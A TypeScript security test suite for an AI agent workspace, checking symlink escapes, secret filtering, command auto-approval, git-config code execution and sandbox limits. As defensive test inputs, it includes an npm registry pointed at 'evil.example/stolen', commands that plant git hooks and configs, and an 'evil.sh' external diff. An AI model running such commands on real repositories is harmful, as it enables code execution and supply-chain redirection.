// The edges of what the crew can reach, each one held: symlinks can't stand in for a file that's
// off limits, the camp's own records stay private, commands and connectors don't see the camp's
// secrets, "runs without asking" covers only what reads, a repository's git config can't run a
// program outside the sandbox, a connector's tool is read-only because it says so (not because
// of its name), and a dropped connection can't take the proxy down.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import net from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { enterSandbox, REPO, NEEDS_SH, NEEDS_POSIX, WINDOWS } from "./helpers/sandbox.ts";

const camp = realpathSync.native(enterSandbox("boundary"));

// Secrets in the camp's own environment, as scripts/env.mjs would have loaded them from .env.
const LEAKY = ["BOUNDARY_API_KEY", "BOUNDARY_TOKEN", "BOUNDARY_SECRET", "BOUNDARY_PASSWORD", "Boundary_Credentials", "JIRA_BOUNDARY_SITE", "ANTHROPIC_BOUNDARY", "CLAUDE_CODE_OAUTH_BOUNDARY", "BOUNDARY_GH_TOKEN"];
for (const name of LEAKY) process.env[name] = `leak-${name}`;
process.env.BOUNDARY_PLAIN = "kept";

// ---------- The camp folder ----------
mkdirSync("camp/agents/scout", { recursive: true });
mkdirSync("camp/checkpoints/exp-1/files", { recursive: true });
writeFileSync("camp/agents/scout/memory.md", "scout-private\n");
writeFileSync("camp/providers.json", '{"key":"provider-key-123"}\n');
writeFileSync("camp/checkpoints/exp-1/files/a.txt", "an earlier copy\n");
writeFileSync("camp/crew.json", "{}\n");
writeFileSync("notes.txt", "hello\n");
mkdirSync("pkgs/.bin", { recursive: true });
mkdirSync("pkgs/tool");
writeFileSync("pkgs/tool/cli.js", "// a tool\n");
symlinkSync("../tool/cli.js", "pkgs/.bin/tool");                       // the node_modules/.bin kind: stays inside

// Somewhere else on disk, with things no agent should reach.
const outside = realpathSync.native(mkdtempSync(join(tmpdir(), "mae-boundary-out-")));
writeFileSync(join(outside, "id_ed25519"), "PRIVATE-KEY-456\n");
writeFileSync(join(outside, "plain.txt"), "outside-text\n");

// What a shell command could leave behind: innocent names that lead somewhere else.
symlinkSync(join(camp, "camp/providers.json"), "zz");
symlinkSync("camp/agents/scout/memory.md", "peek.md");
symlinkSync("camp", "c2");
symlinkSync(join(outside, "plain.txt"), "plain-link.txt");
symlinkSync(outside, "outdir");
symlinkSync("notes.txt", "alias.txt");
symlinkSync(join(outside, "not-yet.txt"), "dangling.txt");

// A linked folder, with edit access.
const site = join(outside, "site");
mkdirSync(join(site, ".git"), { recursive: true });
writeFileSync(join(site, ".git/config"), "[core]\n");
writeFileSync(join(site, "ok.txt"), "fine\n");
writeFileSync(join(site, ".env"), "SITE_SECRET=1\n");
symlinkSync(".env", join(site, "sneak"));
symlinkSync("ok.txt", join(site, "inner.txt"));
symlinkSync(".git/config", join(site, "gitcfg"));
symlinkSync(join(outside, "planted.txt"), join(site, "hole.txt"));     // points at nothing, outside the folder
symlinkSync(join(outside, "planted-dir"), join(site, "holedir"));
symlinkSync(join(site, "ok.txt"), "into-site.txt");
symlinkSync(join(site, ".env"), "into-site-env");

const { campPath, readFileFor, writeFileFor, bashFor, runShell, sandboxPlanFor, readOnlyPlanFor, rl } = await import("../src/tools.ts");
const { addLink, removeLink } = await import("../src/links.ts");
const { autoApproval, isAutoApproved } = await import("../src/shell.ts");
const { setShellLists } = await import("../src/settings.ts");
const { childEnv, sandboxKind, sandboxProfile, bwrapArgs } = await import("../src/sandbox.ts");
const { gitFor } = await import("../src/git.ts");
const explorer = await import("../src/explorer.ts");
const { withExpedition } = await import("../src/context.ts");
const { isReadOnly, mcpToolsFor, connectorStatus, closeConnectors } = await import("../src/mcp.ts");
const { setAsker } = await import("../src/ask.ts");
const { ensureProxy, stopProxy } = await import("../src/netproxy.ts");

// A folder that isn't under a temp folder, for what only shows there: the sandbox lets every
// command write in temp folders, so "this can't be written" needs a project somewhere else.
// node_modules/.cache is ignored by git and is where tools keep throwaway files.
let probe = join(REPO, "node_modules", ".cache", `mae-boundary-${process.pid}`);
try { mkdirSync(probe, { recursive: true }); probe = realpathSync.native(probe); } catch { probe = ""; }
const live = sandboxKind() === "seatbelt" && !!probe;

after(async () => {
  await closeConnectors();
  stopProxy();
  rl.close();
  if (probe) rmSync(probe, { recursive: true, force: true });
});

addLink(site, "write");
const why = (path: string, mode: "read" | "write", self = "scribe") => {
  try { campPath(path, mode, self); return ""; } catch (e: any) { return String(e.message); }
};
const git = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
const newRepo = (dir: string) => {
  mkdirSync(dir, { recursive: true });
  git(dir, "init", "-q", "-b", "main"); git(dir, "config", "user.email", "t@example.com"); git(dir, "config", "user.name", "T");
  writeFileSync(join(dir, "a.txt"), "one\n");
  git(dir, "add", "-A"); git(dir, "commit", "-qm", "first");
  return dir;
};
// A program that leaves a mark when it's run (and passes its input through, as a filter must).
const tripwire = (dir: string, name: string) => {
  const script = join(dir, `${name}.sh`), mark = join(dir, `${name}.ran`);
  writeFileSync(script, `#!/bin/sh\ntouch "${mark}"\ncat 2>/dev/null\nexit 0\n`);
  chmodSync(script, 0o755);
  return { script, mark, ran: () => existsSync(mark), reset: () => rmSync(mark, { force: true }) };
};

// ---------- 1. Symlinks ----------
test("a symlink in the camp can't stand in for a file that's off limits", async () => {
  assert.match(why("zz", "read"), /private camp configuration/, "a link to camp/providers.json");
  await assert.rejects(() => readFileFor("scribe").run!({ path: "zz" }) as Promise<unknown>, /off limits/);
  assert.match(why("c2/providers.json", "read"), /private camp configuration/, "through a linked folder name");
  assert.match(why("peek.md", "read", "scribe"), /private memory/, "another agent's memory");
  assert.match(why("c2/agents/scout/sessions/x.jsonl", "read", "scribe"), /private session history/);
  assert.equal(why("peek.md", "read", "scout"), "", "your own memory is yours to read, by any name");
  assert.match(why("plain-link.txt", "read"), /leads outside the camp/);
  assert.match(why("outdir/plain.txt", "read"), /leads outside the camp/, "a symlinked folder");
  assert.match(why("outdir/id_ed25519", "read"), /off limits|outside the camp/);
});

test("symlinks that stay inside still read; nothing is written through one", { skip: NEEDS_POSIX }, async () => {
  assert.equal(await readFileFor("scribe").run!({ path: "alias.txt" }), "hello\n");
  assert.equal(why("pkgs/.bin/tool", "read"), "", "a node_modules/.bin style link");
  assert.equal(why("into-site.txt", "read"), "", "into a linked folder of this conversation");
  assert.match(why("into-site-env", "read"), /secret/, "but that folder's rules still hold");
  assert.match(why("alias.txt", "write"), /symlink/);
  assert.match(why("outdir/new.txt", "write"), /outside the camp/);
  // A symlink that points at nothing: writing "through" it would create the file it names.
  await assert.rejects(() => writeFileFor("artificer").run!({ path: "dangling.txt", content: "x" }) as Promise<unknown>, /outside the camp/);
  assert.ok(!existsSync(join(outside, "not-yet.txt")), "nothing was created outside");
  assert.equal(why("fresh/new.txt", "write", "artificer"), "", "an ordinary new file is still fine");
});

test("in a linked folder: no way out through a symlink, dangling or not, and no secrets by another name", async () => {
  assert.equal(why("links/site/inner.txt", "read"), "");
  assert.equal(why("links/site/new.txt", "write"), "");
  assert.match(why("links/site/sneak", "read"), /secret/, "a link to .env");
  assert.match(why("links/site/inner.txt", "write"), /symlink/);
  assert.match(why("links/site/gitcfg", "write"), /git's own data/);
  assert.match(why("links/site/hole.txt", "write"), /points outside/);
  assert.match(why("links/site/holedir/x.txt", "write"), /points outside/);
  await assert.rejects(() => writeFileFor("artificer").run!({ path: "links/site/hole.txt", content: "x" }) as Promise<unknown>, /points outside/);
  assert.ok(!existsSync(join(outside, "planted.txt")) && !existsSync(join(outside, "planted-dir")), "nothing was created outside the folder");
});

test("on a disk that ignores case, CAMP/Providers.json is still camp/providers.json", { skip: !existsSync(join(camp, "CAMP")) }, () => {
  assert.match(why("CAMP/Providers.json", "read"), /private camp configuration/);
  assert.match(why("Camp/Agents/scout/memory.md", "read", "scribe"), /private memory/);
  assert.match(why("SKILLS/scribe/new/SKILL.md", "write"), /read-only/);
  assert.equal(why("NOTES.TXT", "read"), "", "an ordinary file by another spelling still reads");
  const repoLink = addLink(REPO, "write");
  try { assert.match(why(`links/${repoLink.name}/SRC/shell.ts`, "write", "artificer"), /camp's own code/); } finally { removeLink(repoLink.name); }
});

// ---------- 2. The camp's own records ----------
test("the access token, the feed, the conversations and the checkpoints are private; the crew list isn't", () => {
  const files = [".token", "feed.jsonl", "threads.jsonl", "quest-log.jsonl", "conversations.json", "memory-log.jsonl", "feedback.jsonl", "limits.json", "providers.json", "settings.json"];
  for (const name of files) assert.match(why(`camp/${name}`, "read"), /off limits/, name);
  assert.match(why("camp/checkpoints/exp-1/files/a.txt", "read"), /off limits/);
  assert.match(why("camp/checkpoints", "read"), /off limits/);
  assert.equal(why("camp/crew.json", "read"), "");
  // And the sandbox hides the same ones from commands, read-only run or not.
  // (Windows has no sandbox to hide them from.)
  if (!WINDOWS) for (const plan of [sandboxPlanFor(camp), readOnlyPlanFor(camp)]) {
    for (const name of [...files, "checkpoints", "agents"]) assert.ok(plan.unreadable!.includes(join(camp, "camp", name)), `${name} is unreadable in the sandbox`);
  }
});

// ---------- 3. The camp's secrets stay out of what it starts ----------
test("commands the crew runs don't see the camp's API keys and tokens", async () => {
  const env = childEnv({ EXTRA: "1" });
  for (const name of [...LEAKY, "ANTHROPIC_API_KEY"]) assert.equal(env[name], undefined, name);
  const path = (e: NodeJS.ProcessEnv) => e.PATH ?? e.Path; // (Windows spells it Path)
  assert.deepEqual([env.BOUNDARY_PLAIN, env.EXTRA, path(env)], ["kept", "1", path(process.env)]);
  // Names only: if this ever fails, the message mustn't print anyone's real environment.
  const namesIn = (out: string) => out.split("\n").map((l) => l.split("=")[0]);
  const seen = namesIn(await runShell("env"));
  assert.ok(seen.includes("BOUNDARY_PLAIN") && seen.includes("PATH"));
  assert.deepEqual(seen.filter((n) => LEAKY.includes(n) || /^ANTHROPIC_/.test(n)), []);
  if (sandboxKind()) assert.deepEqual(namesIn(await runShell("env", { sandbox: readOnlyPlanFor(camp) })).filter((n) => LEAKY.includes(n) || /^ANTHROPIC_/.test(n)), [], "sandboxed too");
  // The owner can let one through on purpose.
  process.env.CAMP_SHELL_ENV_ALLOW = "BOUNDARY_GH_TOKEN, NOT_SET_ANYWHERE";
  try {
    assert.equal(childEnv().BOUNDARY_GH_TOKEN, "leak-BOUNDARY_GH_TOKEN");
    assert.equal(childEnv().BOUNDARY_TOKEN, undefined);
    assert.equal(await runShell("echo $BOUNDARY_GH_TOKEN"), "leak-BOUNDARY_GH_TOKEN");
  } finally { delete process.env.CAMP_SHELL_ENV_ALLOW; }
});

// ---------- 4. What runs without asking ----------
test("runs without asking: not with a URL or another registry, and git branch only to list", () => {
  const asks = [
    "npm view x --registry=https://evil.example/stolen", "npm view x --registry evil.example", "npm view x --reg=evil.example", "npm view x -registry=evil.example",
    "npm view https://evil.example/x.tgz", "npm view x --userconfig=rc", "npm outdated --globalconfig rc", "npm ls --prefix sub", "npm view x --proxy=evil.example:8080",
    "git branch -D main", "git branch -M main", "git branch -m old new", "git branch -d old", "git branch --delete old", "git branch -f main HEAD~3",
    "git branch -c a b", "git branch -C a b", "git branch --set-upstream-to=origin/main", "git branch -u origin/main", "git branch --unset-upstream",
    "git branch --edit-description", "git branch newname", "git branch -v newname", "git branch --list -D old",
  ];
  for (const cmd of asks) assert.ok(!isAutoApproved(cmd), cmd);
  const runs = [
    "git branch", "git branch -a", "git branch -r", "git branch -vv", "git branch --list", "git branch -l -a", "git branch --show-current",
    "git branch --contains HEAD", "git branch --merged main", "git branch --no-merged", "git branch --sort=-committerdate", "git branch -a --format=x",
    "npm view react version", "npm ls", "npm ls --global", "ls -la", "git status", "git log --pretty=oneline -5",
  ];
  for (const cmd of runs) assert.equal(autoApproval(cmd), "builtin", cmd);
  // Your own allow list still says what you want it to.
  setShellLists({ allow: ["git branch -D*", "npm run build"] });
  assert.equal(autoApproval("git branch -D old"), "yours");
  assert.equal(autoApproval("npm run build"), "yours");
  assert.equal(autoApproval("npm run build --prefix sub"), null);
  setShellLists({ allow: [] });
  assert.ok(!isAutoApproved("git branch -D old"));
});

// ---------- 5. A repository's git config can't run programs as you ----------
const armed = newRepo(join(outside, "armed"));
addLink(armed, "write");

test("the git tool and the Files flyout don't run what a repository's config names", { skip: NEEDS_SH }, async () => {
  // Each setting is shown to work with plain git first, so the checks below mean something.
  const filter = tripwire(outside, "filter"), fsmon = tripwire(outside, "fsmonitor"), ext = tripwire(outside, "extdiff"), conv = tripwire(outside, "textconv");
  writeFileSync(join(armed, ".gitattributes"), "*.txt filter=trip diff=trip\n");
  writeFileSync(join(armed, "a.txt"), "two\n");
  git(armed, "config", "filter.trip.clean", filter.script);
  git(armed, "diff", "--no-ext-diff");
  assert.ok(filter.ran(), "plain git runs the clean filter");
  git(armed, "config", "core.fsmonitor", fsmon.script);
  git(armed, "status");
  assert.ok(fsmon.ran(), "plain git runs the fsmonitor program");
  git(armed, "config", "diff.trip.textconv", conv.script);
  git(armed, "diff", "--no-ext-diff", "--textconv");
  assert.ok(conv.ran(), "plain git runs the textconv program");
  git(armed, "config", "diff.external", ext.script);
  git(armed, "diff");
  assert.ok(ext.ran(), "plain git runs the external diff");
  git(armed, "config", "filter.trip.required", "true"); // "fail if the filter can't run": switching it off mustn't break git either
  const trips = [filter, fsmon, ext, conv];
  for (const t of trips) t.reset();

  const tool = gitFor("scribe").run!;
  const where = { in: "links/armed" };
  assert.match(String(await tool({ subcommand: "diff", ...where })), /^\+two$/m, "the diff still comes back");
  assert.match(String(await tool({ subcommand: "status", args: ["--short"], ...where })), /a\.txt/);
  assert.match(String(await tool({ subcommand: "log", args: ["-p"], ...where })), /first/);
  assert.match(String(await tool({ subcommand: "show", args: ["HEAD"], ...where })), /\+one/);
  assert.match(String(await tool({ subcommand: "blame", args: ["a.txt"], ...where })), /two/);
  for (const args of [["-v"], ["--verbose"], ["-sv"]]) assert.match(String(await tool({ subcommand: "status", args, ...where })), /isn't available here/, `status ${args[0]}`);
  assert.match(String(await tool({ subcommand: "diff", args: ["--ignore-submodules=none"], ...where })), /isn't available here/);
  assert.deepEqual(await explorer.changedFiles(armed), { ".gitattributes": "U", "a.txt": "M" });
  assert.match((await explorer.fileDiff(armed, "a.txt")).diff, /^\+two$/m);
  assert.ok((await explorer.findFiles(armed, "a.txt")).includes("a.txt"));
  for (const t of trips) assert.ok(!t.ran(), `${t.script} was not run`);
});

test("the sandbox's writable folder is the project the camp was given, whatever a nested repository claims", { skip: NEEDS_POSIX }, async () => {
  const proj = newRepo(join(outside, "proj"));
  const victim = newRepo(join(outside, "victim"));
  addLink(proj, "write");
  addLink(victim, "write");
  mkdirSync(join(proj, "packages", "app"), { recursive: true });
  assert.deepEqual(sandboxPlanFor(proj).writable, [proj]);
  assert.deepEqual(sandboxPlanFor(join(proj, "packages", "app")).writable, [proj], "from anywhere inside it");
  // A repository made inside the project that says its working tree is the folder above everything.
  const nested = newRepo(join(proj, "nested"));
  git(nested, "config", "core.worktree", outside);
  assert.equal(git(nested, "rev-parse", "--show-toplevel"), outside, "git would call that the project");
  assert.deepEqual(sandboxPlanFor(nested).writable, [nested]);
  // One that says its git data lives in another repository's .git folder.
  const liar = newRepo(join(proj, "liar"));
  writeFileSync(join(liar, ".git", "commondir"), join(victim, ".git") + "\n");
  assert.deepEqual(sandboxPlanFor(liar).writable.filter((p) => p.startsWith(victim)), [], "the other repository's .git isn't handed over");
  // A folder the camp wasn't given at all: nothing but temp is writable.
  assert.deepEqual(sandboxPlanFor(newRepo(join(outside, "stranger"))).writable, []);
  // A real worktree of the linked repository still gets the main repository's .git (commits need it).
  const wt = join(outside, "proj-camp", "wt");
  git(proj, "worktree", "add", "-q", "-b", "camp/wt", wt, "HEAD");
  await withExpedition({ id: "exp-boundary-wt", workspaces: { proj: { link: "proj", path: wt, branch: "camp/wt" } } }, async () => {
    const plan = sandboxPlanFor(wt);
    assert.deepEqual(plan.writable, [wt, join(proj, ".git")]);
    assert.ok(plan.readOnly!.includes(join(proj, ".git", "config")) && plan.readOnly!.includes(join(proj, ".git", "hooks")));
  });
});

test("the sandbox profile: git's config and hooks can't be written in any repository, and a read-only run can write nothing of the project", () => {
  const profile = sandboxProfile({ writable: ["/work/project"] }).split("\n");
  const at = (start: string) => profile.findIndex((l) => l.startsWith(start));
  assert.ok(at("(deny file-write* (require-all (regex") > at("(allow file-write*"), "after the allow, so it wins");
  assert.match(profile[at("(deny file-write* (require-all (regex")], /\\\.git\/\(config\|hooks\(\/\.\*\)\?\|modules\(\/\.\*\)\?\)\$/);
  // Read-only runs: nothing of the project is writable.
  assert.doesNotMatch(sandboxProfile(readOnlyPlanFor(armed)), new RegExp(`file-write\\* [^\\n]*${armed.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
  // Linux: the config and hooks of repositories found in the project are covered, and a read-only run still hides .env.
  const args = bwrapArgs({ writable: [outside], envRoots: [site] }, "true");
  const has = (...seq: string[]) => args.some((_, i) => seq.every((s, j) => args[i + j] === s));
  assert.ok(has("--ro-bind", join(armed, ".git", "config"), join(armed, ".git", "config")) && has("--ro-bind", join(armed, ".git", "hooks"), join(armed, ".git", "hooks")));
  assert.ok(has("--ro-bind", "/dev/null", join(site, ".env")));
});

test("live: a sandboxed command can't plant git config or hooks in the project, in any repository", { skip: !live }, async () => {
  const proj = newRepo(join(probe, "plant"));
  addLink(proj, "write");
  const sandbox = sandboxPlanFor(proj);
  assert.equal(await runShell("echo ok > f.txt && cat f.txt", { cwd: proj, sandbox }), "ok");
  for (const cmd of ["mkdir -p x/.git && echo evil > x/.git/config", "mkdir -p y/.git/hooks && echo evil > y/.git/hooks/pre-commit", "mkdir -p z/.git/modules/m && echo evil > z/.git/modules/m/config", "git config diff.external ./evil.sh"]) {
    assert.match(await runShell(cmd, { cwd: proj, sandbox }), /Operation not permitted/, cmd);
  }
  assert.ok(!existsSync(join(proj, "x/.git/config")) && !existsSync(join(proj, "y/.git/hooks")));
  assert.match(await runShell("git add -A && git commit -qm sandboxed && git log --oneline -1", { cwd: proj, sandbox }), /sandboxed/, "commits still work");
  // In a temp folder (where test suites make their repositories) git works as usual.
  assert.equal(await runShell('d=$(mktemp -d) && git init -q "$d" && git -C "$d" config user.name x && echo fine; rm -rf "$d"', { cwd: proj, sandbox }), "fine");
});

test("live: the read-only commands run inside the sandbox, where a planted external diff can change nothing", { skip: !live }, async () => {
  const proj = newRepo(join(probe, "readonly"));
  const link = addLink(proj, "write");
  const L = `links/${link.name}`;
  writeFileSync(join(proj, "a.txt"), "two\n");
  const mark = join(proj, "escaped.txt");
  writeFileSync(join(proj, "evil.sh"), `#!/bin/sh\ntouch "${mark}"\n`);
  chmodSync(join(proj, "evil.sh"), 0o755);
  git(proj, "config", "diff.external", join(proj, "evil.sh"));
  git(proj, "diff");
  assert.ok(existsSync(mark), "outside the sandbox it runs and writes");
  rmSync(mark);
  const asked: string[] = [];
  setAsker(async (q) => { asked.push(q.body); return "n"; });
  const bash = bashFor("artificer").run!;
  await bash({ command: "git diff", cwd: L });
  assert.ok(!existsSync(mark), "inside it, it can't");
  git(proj, "config", "--unset", "diff.external");
  // And the usual ones still work there, without asking.
  assert.match(String(await bash({ command: "ls", cwd: L })), /a\.txt/);
  assert.match(String(await bash({ command: "git status", cwd: L })), /modified:\s+a\.txt/);
  assert.match(String(await bash({ command: "git diff", cwd: L })), /^\+two$/m);
  assert.match(String(await bash({ command: "git log -3", cwd: L })), /first/);
  assert.equal(asked.length, 0);
  // The camp's private files can't be read this way either, and a command the sandbox stopped says how to ask for more.
  const stopped = String(await bash({ command: "wc -c camp/providers.json" }));
  assert.match(stopped, /Operation not permitted.*read-only sandbox.*unsandboxed: true/s);
  assert.doesNotMatch(String(await bash({ command: "ls no-such-folder", cwd: L })), /read-only sandbox/, "an ordinary failure is just that");
  assert.match(String(await bash({ command: "git status", cwd: L, unsandboxed: true })), /declined/, "asked for unsandboxed, it waits for you like any other command");
  assert.equal(asked.length, 1);
});

// ---------- 7. Connectors ----------
test("a connector's tool is read-only when it says so or you say so, not because of its name", () => {
  assert.ok(isReadOnly({ name: "get_issue" }) && isReadOnly({ name: "list_notes" }) && isReadOnly({ name: "search-code" }));
  for (const name of ["query", "query_database", "fetch", "fetch_url", "check_and_fix", "delete_note", "run"]) assert.ok(!isReadOnly({ name }), name);
  assert.ok(isReadOnly({ name: "run_report", annotations: { readOnlyHint: true } }));
  assert.ok(!isReadOnly({ name: "get_and_clear", annotations: { readOnlyHint: false } }), "it says it isn't read-only");
  assert.ok(!isReadOnly({ name: "list_then_purge", annotations: { destructiveHint: true } }));
  assert.ok(!isReadOnly({ name: "get_x", annotations: { readOnlyHint: true, destructiveHint: true } }), "destructive wins over a mixed message");
  assert.ok(isReadOnly({ name: "query" }, { readTools: ["query"] }), "your word is final");
  assert.ok(isReadOnly({ name: "get_and_clear", annotations: { readOnlyHint: false } }, { readTools: ["get_and_clear"] }));
});

test("connectors: a tool called query isn't offered as read-only, and the server doesn't see the camp's secrets", async () => {
  cpSync(join(REPO, "tests/fixtures/db-server.mjs"), "db-server.mjs");
  const dropped = join(camp, "dropped.txt");
  const server = { command: "node", args: ["db-server.mjs", dropped] };
  writeFileSync("camp/mcp.json", JSON.stringify({ servers: {
    db: { ...server, agents: ["scout"], env: { CONNECTOR_TOKEN: "handed-over" } },
    vouched: { ...server, agents: ["scribe"], readTools: ["query"] },
    writable: { ...server, agents: ["artificer"], allowWrite: true },
  } }));
  const names = async (agent: string) => (await mcpToolsFor(agent)).map((t: any) => t.def.name.replace(/^mcp__\w+?__/, ""));
  assert.deepEqual(await names("scout"), ["run_report", "lookup_user", "show_env"]);
  assert.deepEqual(await names("scribe"), ["query", "run_report", "lookup_user", "show_env"]);
  const status = (await connectorStatus()).find((s) => s.name === "writable")!;
  assert.deepEqual(status.tools.filter((t) => t.write).map((t) => t.name), ["query", "fetch_url", "check_and_fix", "get_and_clear_queue", "list_then_purge"]);
  // With writes allowed, query asks first.
  let asked = 0;
  setAsker(async () => { asked++; return "n"; });
  const query = (await mcpToolsFor("artificer")).find((t: any) => t.def.name.endsWith("__query"))!;
  assert.match(String(await query.run!({})), /declined/);
  assert.ok(asked === 1 && !existsSync(dropped));
  // What the server process was started with: its own "env", and none of the camp's secrets.
  const showEnv = (await mcpToolsFor("scout")).find((t: any) => t.def.name.endsWith("__show_env"))!;
  const seen = JSON.parse(String(await showEnv.run!({})));
  assert.deepEqual(Object.keys(seen).sort(), ["BOUNDARY_PLAIN", "CONNECTOR_TOKEN"]);
  assert.equal(seen.CONNECTOR_TOKEN, "handed-over");
});

// ---------- 8. The proxy ----------
test("the proxy survives a client that hangs up the moment it's refused", async () => {
  const port = await ensureProxy();
  const hangUp = () => new Promise<void>((ok) => {
    const s = net.connect(port, "127.0.0.1", () => {
      s.write("CONNECT blocked.example.com:443 HTTP/1.1\r\nHost: blocked.example.com:443\r\n\r\n", () => { s.resetAndDestroy(); });
    });
    s.on("error", () => {});
    s.on("close", () => ok());
  });
  for (let i = 0; i < 30; i++) await hangUp();
  await new Promise((ok) => setTimeout(ok, 100)); // let any late socket error surface (it would end this process)
  const answer = await new Promise<string>((ok) => {
    const s = net.connect(port, "127.0.0.1", () => s.write("CONNECT blocked.example.com:443 HTTP/1.1\r\n\r\n"));
    let got = "";
    s.on("data", (d) => (got += d));
    s.on("close", () => ok(got));
  });
  assert.match(answer, /^HTTP\/1\.1 403 Forbidden/, "still answering");
});

test("a private camp file's other forms are as private as it is: the copy set aside when it couldn't be read, and a half-written one", async () => {
  const { readFileFor, sandboxPlanFor } = await import("../src/tools.ts");
  const { mkdirSync, writeFileSync } = await import("node:fs");
  mkdirSync("camp", { recursive: true });
  writeFileSync("camp/settings.json.damaged-2026-01-05T10-00-00-000Z", '{"phone": {"topic": "secret-topic"}}');
  writeFileSync("camp/providers.json.tmp-4242-ab12cd", '{"groq": {"key": "secret-key"}}');
  writeFileSync("camp/crew.json.damaged-2026-01-05T10-00-00-000Z", '{"crew": []}'); // not a private file: still readable
  const read = (path: string) => readFileFor("scout").run!({ path }).then(String);
  await assert.rejects(read("camp/settings.json.damaged-2026-01-05T10-00-00-000Z"), /private camp configuration/);
  await assert.rejects(read("camp/providers.json.tmp-4242-ab12cd"), /private camp configuration/);
  assert.match(await read("camp/crew.json.damaged-2026-01-05T10-00-00-000Z"), /crew/);
  const hidden = sandboxPlanFor(process.cwd()).unreadable ?? [];
  assert.ok(hidden.some((p) => p.endsWith("settings.json.damaged-2026-01-05T10-00-00-000Z")) && hidden.some((p) => p.endsWith("providers.json.tmp-4242-ab12cd")), "and a sandboxed command can't read them either");
});
